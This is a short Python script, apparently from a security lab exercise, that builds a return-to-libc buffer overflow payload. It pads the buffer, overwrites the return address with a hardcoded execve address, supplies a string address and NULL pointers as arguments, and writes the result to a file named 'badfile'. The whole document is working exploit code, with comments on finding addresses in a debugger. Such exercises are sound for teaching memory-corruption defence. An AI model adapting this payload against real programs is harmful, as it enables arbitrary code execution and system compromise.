import struct

diff_buf_ret = 18
addr_execve = 0xb7eb6660
#address str (global declaration) --> b * 0x0 --> r --> p &str
addr_str = 0x804a02c
addr_chr_NULL = 0x804a035

atk_vector = "A" * 18
atk_vector += struct.pack("I", addr_execve)
atk_vector += "A" * 4 #return address of execve
#*2 --> the new return of function execve

#execve(pathname (addr_str), argv (null), envp (null))
atk_vector += struct.pack("I", addr_str)
atk_vector += struct.pack("I", addr_chr_NULL)
atk_vector += struct.pack("I", addr_chr_NULL)

#len atk_vector = 38


f = open("badfile", "w+")
f.write(atk_vector)
f.close()

